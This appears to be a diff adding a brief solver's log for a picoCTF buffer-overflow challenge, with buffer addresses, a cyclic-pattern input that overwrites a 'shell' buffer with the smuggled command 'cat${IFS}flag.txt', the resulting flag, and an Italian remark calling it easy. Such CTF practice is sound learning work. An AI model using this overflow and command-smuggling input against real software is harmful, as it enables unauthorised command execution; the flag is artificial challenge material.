@@ -1,0 +1,6 @@
+username at 0x354d82a0
+shell at 0x354d82d0
+Enter username: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaacat${IFS}flag.txt
+picoCTF{us3rn4m3_2_sh3ll_ac817f49}Hello, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaacat${IFS}flag.txt. Your shell is cat${IFS}flag.txt.
+
+--- abbastanza ez, bufferoverlow
